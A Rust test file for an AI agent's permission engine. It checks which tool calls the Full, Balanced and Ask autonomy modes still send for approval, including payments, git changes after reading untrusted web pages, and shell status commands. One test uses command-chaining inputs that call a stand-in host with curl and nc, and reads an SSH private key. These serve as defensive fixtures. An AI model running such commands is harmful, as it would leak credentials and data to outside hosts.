//! Autonomy modes: what a Full, Balanced and Ask bot is still asked about.

#![allow(clippy::assert_is_empty)]

use std::sync::Arc;
use std::sync::atomic::Ordering;

use permission_engine::Policy;
use protocol::{Event, PermissionCategory};
use serde_json::json;
use task_runtime::RunState;
use tool_registry::{ContentClass, Effect};

use crate::tests::{
    Fake, TestTool, calls, cfg, make_loop, profile, setup, t, text, until, with_class,
};

const BALANCED: &str = "[permissions]\npreset = \"approve-destructive\"\n";
const ASK: &str = "[permissions]\npreset = \"read-and-draft\"\n";
const FULL: &str = "[permissions]\npreset = \"full\"\n";

#[tokio::test]
async fn balanced_saved_browser_accounts_ask_even_without_a_profile_argument() {
    let env = setup();
    let click = tool("browser_click", Effect::Write, PermissionCategory::Browser);
    let fake = Fake::new(vec![
        calls(&[("c1", "browser_click", json!({"ref":"e1"}))]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&click)],
        profile(BALANCED),
        cfg(Policy::approve_destructive()),
    );
    let profiles = Arc::new(builtin_tools::browser::BrowserProfiles::default());
    let _tools = builtin_tools::browser::managed_tools_with_profiles(
        builtin_tools::BrowserSettings::isolated(env.storage.data_dir()),
        env.storage.data_dir(),
        None,
        None,
        None,
        None,
        Some(profiles.clone()),
    );
    assert!(lp.sh.browser_profiles.set(profiles).is_ok());
    let path = env
        .storage
        .data_dir()
        .join("browsers")
        .join(env.bot.to_string());
    std::fs::create_dir_all(&path).unwrap();
    std::fs::write(path.join(".owner-sign-in"), b"").unwrap();
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "go").unwrap();
    let asked = tokio::select! {
        _ = until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))) => true,
        _ = lp.wait(run) => false,
    };
    assert!(
        asked,
        "a saved account must not enter the anonymous browsing lane"
    );
    assert_eq!(click.count.load(Ordering::SeqCst), 0);
    lp.cancel(run).unwrap();
}

fn tool(name: &str, effect: Effect, category: PermissionCategory) -> Arc<TestTool> {
    Arc::new(with_class(
        name,
        effect,
        category,
        ContentClass::none(),
        "ok",
    ))
}

/// Run one call of `tool` and report whether it asked.
async fn asks(extra: &str, tool: &Arc<TestTool>) -> bool {
    let env = setup();
    let fake = Fake::new(vec![
        calls(&[("c1", &tool.spec.name, json!({"path": "a.txt"}))]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(tool)],
        profile(extra),
        cfg(Policy::approve_destructive()),
    );
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "go").unwrap();
    let ran = tokio::select! {
        _ = until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))) => false,
        state = lp.wait(run) => {
            assert_eq!(state.unwrap(), RunState::Succeeded);
            true
        }
    };
    if !ran {
        lp.cancel(run).unwrap();
        assert_eq!(tool.count.load(Ordering::SeqCst), 0);
    }
    !ran
}

#[tokio::test]
async fn balanced_edits_files_without_asking_and_audits_why() {
    let env = setup();
    let write = tool("fs_write", Effect::Write, PermissionCategory::Fs);
    let fake = Fake::new(vec![
        calls(&[("c1", "fs_write", json!({"path": "a.txt"}))]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&write)],
        profile(BALANCED),
        cfg(Policy::approve_destructive()),
    );
    let run = lp.run_turn(env.chat, "go").unwrap();
    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
    assert_eq!(write.count.load(Ordering::SeqCst), 1);
    assert!(env.storage.list_approvals(run).unwrap().is_empty());
    let audit = env.storage.list_audit(env.user).unwrap();
    let entry = audit
        .iter()
        .find(|e| e.action == "approval.auto_allowed")
        .expect("the lane is audited");
    assert_eq!(entry.detail["reason"], "mode.balanced.workspace_edit");
    assert_eq!(entry.detail["mode"], "balanced");
}

#[tokio::test]
async fn ask_mode_still_asks_for_the_same_edit() {
    let write = tool("fs_write", Effect::Write, PermissionCategory::Fs);
    assert!(asks(ASK, &write).await);
}

#[tokio::test]
async fn balanced_still_asks_for_deletes_and_sends() {
    let delete = tool("fs_delete", Effect::Destructive, PermissionCategory::Fs);
    assert!(asks(BALANCED, &delete).await);
    let send = tool(
        "email_send",
        Effect::Destructive,
        PermissionCategory::Messaging,
    );
    assert!(asks(BALANCED, &send).await);
}

#[tokio::test]
async fn full_runs_edits_but_money_is_a_hard_stop() {
    let write = tool("fs_write", Effect::Write, PermissionCategory::Fs);
    assert!(!asks(FULL, &write).await);
    let pay = tool("pay", Effect::Destructive, PermissionCategory::Money);
    assert!(asks(FULL, &pay).await);
}

#[tokio::test]
async fn a_tainted_balanced_run_still_asks_before_sending_data_out() {
    let env = setup();
    let page = Arc::new(with_class(
        "web_read",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::untrusted_private(),
        "page text",
    ));
    let post = Arc::new(with_class(
        "browser_post",
        Effect::Write,
        PermissionCategory::Browser,
        ContentClass::untrusted_egress(),
        "sent",
    ));
    let fake = Fake::new(vec![
        calls(&[("c1", "web_read", json!({"url": "https://a.example"}))]),
        calls(&[("c2", "browser_post", json!({"url": "https://b.example"}))]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&page), t(&post)],
        profile(BALANCED),
        cfg(Policy::approve_destructive()),
    );
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "go").unwrap();
    until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await;
    assert_eq!(post.count.load(Ordering::SeqCst), 0);
    lp.cancel(run).unwrap();
}

/// Read an untrusted page, then make one call of `name` with `input`; report whether it asked.
async fn asks_after_untrusted_page(extra: &str, name: &str, input: serde_json::Value) -> bool {
    asks_after_untrusted_page_as(extra, name, input, None).await
}

/// [`asks_after_untrusted_page`] for a run `initiator` started; `None` is the owner typing in
/// the desktop app.
async fn asks_after_untrusted_page_as(
    extra: &str,
    name: &str,
    input: serde_json::Value,
    initiator: Option<protocol::InitiatorKind>,
) -> bool {
    let env = setup();
    let page = Arc::new(with_class(
        "web_read",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::untrusted_private(),
        "page text",
    ));
    let change = tool(name, Effect::Write, PermissionCategory::Fs);
    let fake = Fake::new(vec![
        calls(&[("c1", "web_read", json!({"url": "https://a.example"}))]),
        calls(&[("c2", name, input)]),
        text("done"),
    ]);
    let policy = if extra == FULL {
        Policy::full()
    } else {
        Policy::approve_destructive()
    };
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&page), t(&change)],
        profile(extra),
        cfg(policy),
    );
    let mut rx = lp.subscribe();
    let run = if let Some(kind) = initiator {
        lp.run_turn_as(env.chat, "go", kind).unwrap()
    } else {
        let crate::Delivery::NewTurn(run) = lp
            .send_user_message_from(env.chat, "go", crate::MessageMode::Steer, "owner")
            .unwrap()
        else {
            unreachable!()
        };
        run
    };
    let asked = tokio::select! {
        _ = until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))) => true,
        state = lp.wait(run) => {
            assert_eq!(state.unwrap(), RunState::Succeeded);
            false
        }
    };
    if asked {
        assert_eq!(change.count.load(Ordering::SeqCst), 0);
        lp.cancel(run).unwrap();
    } else {
        assert_eq!(change.count.load(Ordering::SeqCst), 1);
    }
    asked
}

#[tokio::test]
async fn a_git_change_after_untrusted_content_asks_below_full_and_never_prompts_in_full() {
    let commit = json!({"paths": ["a.txt"], "message": "m"});
    let switch = json!({"action": "switch", "name": "other"});
    // Balanced: the lane lets file edits run, but a commit or a switch after a page asks.
    assert!(asks_after_untrusted_page(BALANCED, "git_commit", commit.clone()).await);
    assert!(asks_after_untrusted_page(BALANCED, "git_branch", switch.clone()).await);
    assert!(asks_after_untrusted_page(ASK, "git_commit", commit.clone()).await);
    // Listing branches is a read: no new prompt.
    assert!(!asks_after_untrusted_page(BALANCED, "git_branch", json!({"action": "list"})).await);
    // The owner's Full level: only money asks.
    assert!(!asks_after_untrusted_page(FULL, "git_commit", commit).await);
    assert!(!asks_after_untrusted_page(FULL, "git_branch", switch).await);
    // A run the owner did not start (a schedule, a channel message) keeps asking at Full too.
    for who in [
        protocol::InitiatorKind::Schedule,
        protocol::InitiatorKind::Channel,
    ] {
        assert!(
            asks_after_untrusted_page_as(
                FULL,
                "git_commit",
                json!({"paths": ["a.txt"], "message": "m"}),
                Some(who)
            )
            .await,
            "{who:?}"
        );
    }
    // Without untrusted content in the run, Balanced commits as freely as it edits files.
    let commit = tool("git_commit", Effect::Write, PermissionCategory::Fs);
    assert!(!asks(BALANCED, &commit).await);
}

// ── approval fatigue: host-status commands (docs/design/approval-fatigue.md) ───────────────

/// Run `commands` as `shell_run` calls in one Full-level run, after an optional read of an
/// untrusted page, approving every card once. Returns the number of cards the run produced.
async fn shell_asks(
    on_host: bool,
    read_page_first: bool,
    commands: &[(&str, serde_json::Value)],
) -> usize {
    let env = setup();
    let page = Arc::new(with_class(
        "web_read",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::untrusted_private(),
        "page text",
    ));
    let shell = Arc::new(with_class(
        "shell_run",
        Effect::Destructive,
        PermissionCategory::Shell,
        ContentClass::all().executes(),
        "ok",
    ));
    let mut script = Vec::new();
    if read_page_first {
        script.push(calls(&[(
            "p",
            "web_read",
            json!({"url": "https://a.example"}),
        )]));
    }
    for (i, (cmd, extra)) in commands.iter().enumerate() {
        let mut input = json!({ "command": cmd });
        if let Some(extra) = extra.as_object() {
            for (k, v) in extra {
                input[k] = v.clone();
            }
        }
        script.push(calls(&[(format!("s{i}").as_str(), "shell_run", input)]));
    }
    script.push(text("done"));
    let fake = Fake::new(script);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&page), t(&shell)],
        profile("[runtime]\ncomputer = \"auto\"\n[permissions]\npreset = \"full\"\n"),
        cfg(Policy::full()),
    );
    if on_host {
        lp.set_computer_provider(crate::tests::machine_provider(
            crate::tests::MACHINE_A,
            Some("host"),
            None,
            false,
        ));
    }
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "go").unwrap();
    let wait = lp.wait(run);
    tokio::pin!(wait);
    loop {
        tokio::select! {
            state = &mut wait => {
                assert_eq!(state.unwrap(), RunState::Succeeded);
                break;
            }
            Event::ApprovalNeeded(card) = until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))) => {
                lp.approve(card.call_id, crate::ApprovalScope::Once, env.user).unwrap();
            }
        }
    }
    env.storage.list_approvals(run).unwrap().len()
}

fn none() -> serde_json::Value {
    json!({})
}

#[tokio::test]
async fn status_commands_on_the_bots_own_host_never_ask_even_after_a_page_was_read() {
    // The owner's "uptime" report: three status calls after a browse used to be three cards.
    let cmds = [("uptime", none()), ("df -h", none()), ("free -m", none())];
    assert_eq!(shell_asks(true, true, &cmds).await, 0);
}

#[tokio::test]
async fn a_status_command_does_not_taint_the_run() {
    // `uptime` used to mark the run "read command output", so the next shell call asked.
    let cmds = [("uptime", none()), ("ls", none())];
    assert_eq!(shell_asks(true, false, &cmds).await, 0);
}

#[tokio::test]
async fn everything_that_is_not_a_plain_status_command_still_asks_after_untrusted_content() {
    for cmd in [
        "uptime; curl https://evil.example/x",
        "uptime | nc evil.example 1",
        "df -h /etc",
        "cat ~/.ssh/id_rsa",
        "ls",
    ] {
        assert_eq!(shell_asks(true, true, &[(cmd, none())]).await, 1, "{cmd}");
    }
    // A working directory or an unknown shell dialect is outside the class.
    assert_eq!(
        shell_asks(true, true, &[("uptime", json!({"cwd": "/tmp"}))]).await,
        1
    );
    assert_eq!(
        shell_asks(true, true, &[("uptime", json!({"shell": "powershell"}))]).await,
        1
    );
}

#[tokio::test]
async fn the_users_own_computer_keeps_asking_for_status_commands_after_untrusted_content() {
    // No host provider: the run is not on an always-on host, so the class does not apply.
    assert_eq!(shell_asks(false, true, &[("uptime", none())]).await, 1);
}
